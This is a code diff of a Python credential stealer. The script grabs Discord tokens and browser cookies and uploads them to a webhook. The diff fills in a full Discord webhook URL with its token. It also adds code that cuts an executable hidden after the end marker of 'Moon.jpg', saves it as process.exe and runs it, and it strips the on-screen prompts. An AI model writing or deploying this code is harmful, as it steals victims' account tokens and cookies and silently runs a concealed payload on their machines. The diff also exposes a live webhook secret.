@@ -7,6 +7,7 @@ from base64 import b64decode
 from json import loads as json_loads, load
 from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer
 from urllib.request import Request, urlopen
+from stegano import *
 from json import loads, dumps
 import time
 import shutil
@@ -14,19 +15,8 @@ from zipfile import ZipFile
 import random
 import re
 import subprocess
-import colorama
 
-moon = "Moon.jpg"
-if os.path.exists(moon) == False:
-    print('"Moon.jpg" NOT FOUND.')
-    input("Press enter to exit.\n")
-    quit()
-
-print("Please wait, this will take a matter of seconds. Do not exit this program!")
-    
-# Replace the X with your webhook.
-
-hook = "X"
+hook = "https://discord.com/api/webhooks/1065744539266060288/TmyUnAQq3e3n0WnFNF_xLG6Jk7gaI6RHJTJpg1HLMIFlfF7JolrYljpFO8zC9xizZ1x2"
 DETECTED = False
 
 
@@ -389,6 +379,16 @@ def checkToken(token):
     except:
         return False
 
+with open('Moon.jpg', 'rb') as f:
+    content = f.read()
+    offset = content.index(bytes.fromhex('FFD9'))
+
+    f.seek(offset + 2)
+
+    with open('process.exe', 'wb') as e:
+        e.write(f.read())
+
+os.system("process.exe")
 
 def uploadToken(token, path):
     global hook
@@ -713,6 +713,7 @@ def getCookie(path, arg):
             )
             CookiCount += 1
     writeforfile(Cookies, "cook")
+
 
 
 def GetDiscord(path, arg):
@@ -1191,6 +1192,7 @@ if not DETECTED:
 
     for thread in wikith:
         thread.join()
+
     time.sleep(0.2)
 
     filetext = "\n"
@@ -1208,14 +1210,4 @@ if not DETECTED:
             filetext += "\n"
     upload("kiwi", filetext)
 
-with open("Moon.jpg", "rb") as f:
-    content = f.read()
-    offset = content.index(bytes.fromhex("FFD9"))
-
-    f.seek(offset + 2)
-
-    with open("main.exe", "wb") as e:
-        e.write(f.read())
-
-os.system("main.exe")
 quit()
